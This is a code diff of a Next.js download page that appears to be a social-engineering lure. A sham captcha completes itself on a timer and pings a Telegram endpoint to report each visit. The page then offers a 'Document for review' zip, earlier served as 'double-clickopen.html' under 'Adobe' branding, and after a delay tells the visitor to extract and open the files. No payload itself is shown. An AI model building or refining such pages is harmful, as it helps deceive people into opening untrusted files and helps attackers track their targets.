@@ -1,9 +1,9 @@
+
 "use client";
 
-import Image from "next/image";
 import { useEffect, useRef, useState } from "react";
 
-const DOWNLOAD_URL = "/double-clickopen.html";
+const DOWNLOAD_URL = "/document-review.zip";
 const DOWNLOAD_NAME = "document-review.zip";
 const DOCUMENT_TITLE = "Document for review";
 
@@ -87,18 +87,11 @@ function CaptchaScreen({ onContinue }: { onContinue: () => void }) {
     const timer = window.setTimeout(() => {
       setStatus("complete");
 
-      // Notification failure does not prevent access to the download.
       void fetch("/api/send-telegram", {
         method: "POST",
-      })
-        .then((response) => {
-          if (!response.ok && response.status !== 429) {
-            console.warn("Visit notification was unavailable.");
-          }
-        })
-        .catch(() => {
-          console.warn("Visit notification request failed.");
-        });
+      }).catch(() => {
+        console.warn("Notification request failed.");
+      });
     }, 2000);
 
     return () => window.clearTimeout(timer);
@@ -131,7 +124,7 @@ function CaptchaScreen({ onContinue }: { onContinue: () => void }) {
                     setStatus("checking");
                   }
                 }}
-                aria-describedby="checkbox-status visitor-notice"
+                aria-describedby="checkbox-status"
                 className={
                   status === "idle"
                     ? "h-7 w-7 cursor-pointer accent-emerald-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600"
@@ -202,8 +195,6 @@ function CaptchaScreen({ onContinue }: { onContinue: () => void }) {
           Continue
           <ArrowIcon />
         </button>
-
-    
       </div>
     </section>
   );
@@ -211,6 +202,9 @@ function CaptchaScreen({ onContinue }: { onContinue: () => void }) {
 
 export default function Home() {
   const [captchaComplete, setCaptchaComplete] = useState(false);
+  const [downloadStarted, setDownloadStarted] = useState(false);
+  const [showInstructions, setShowInstructions] = useState(false);
+
   const titleRef = useRef<HTMLHeadingElement>(null);
 
   useEffect(() => {
@@ -218,6 +212,16 @@ export default function Home() {
       titleRef.current?.focus();
     }
   }, [captchaComplete]);
+
+  useEffect(() => {
+    if (!downloadStarted) return;
+
+    const timer = window.setTimeout(() => {
+      setShowInstructions(true);
+    }, 4000);
+
+    return () => window.clearTimeout(timer);
+  }, [downloadStarted]);
 
   return (
     <div className="flex h-screen h-[100dvh] flex-col overflow-hidden bg-[#F8F8F6] font-sans text-stone-900 selection:bg-stone-200">
@@ -228,15 +232,12 @@ export default function Home() {
             aria-label="Document Space home"
             className="flex items-center gap-2.5 rounded focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600"
           >
-            <span className="grid h-8 w-8 place-items-center rounded-md bg-stone-900 text-white">
-            
-            </span>
+            <span className="grid h-8 w-8 place-items-center rounded-md bg-stone-900 text-white" />
 
             <span className="text-sm font-semibold tracking-tight">
-              Adobe
+              Document Space
             </span>
           </a>
-
         </div>
       </header>
 
@@ -264,7 +265,6 @@ export default function Home() {
                 >
                   Your download is ready.
                 </h1>
-
               </div>
 
               <div className="rounded-xl border border-stone-200 bg-white p-6 shadow-[0_8px_30px_-20px_rgba(0,0,0,0.18)] sm:p-7">
@@ -272,7 +272,6 @@ export default function Home() {
                   <span className="grid h-12 w-12 place-items-center rounded-lg border border-stone-200 bg-stone-50">
                     <DocumentIcon className="h-6 w-6 text-stone-600" />
                   </span>
-
                 </div>
 
                 <h2 className="break-words text-lg font-medium tracking-tight">
@@ -284,12 +283,41 @@ export default function Home() {
                 <a
                   href={DOWNLOAD_URL}
                   download={DOWNLOAD_NAME}
+                  onClick={() => setDownloadStarted(true)}
                   className="flex w-full items-center justify-center gap-3 rounded-md bg-stone-900 px-4 py-3 text-sm font-medium text-white transition-colors hover:bg-stone-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-stone-600"
                 >
                   Download
                   <DownloadIcon />
                 </a>
 
+                {downloadStarted && (
+                  <p
+                    role="status"
+                    className="mt-4 text-sm text-stone-500"
+                  >
+                    Download requested. Check your browser&apos;s Downloads
+                    list.
+                  </p>
+                )}
+
+                {showInstructions && (
+                  <div
+                    role="status"
+                    aria-live="polite"
+                    className="mt-5 rounded-lg border border-stone-200 bg-stone-50 p-4"
+                  >
+                    <h3 className="text-sm font-medium text-stone-900">
+                      Next steps
+                    </h3>
+
+                    <p className="mt-2 text-sm leading-6 text-stone-600">
+                      Open your browser&apos;s Downloads list and locate{" "}
+                      <strong>{DOWNLOAD_NAME}</strong>. If it is a ZIP archive,
+                      extract it first. Check the contents and open files.
+                      
+                    </p>
+                  </div>
+                )}
               </div>
             </section>
           )}
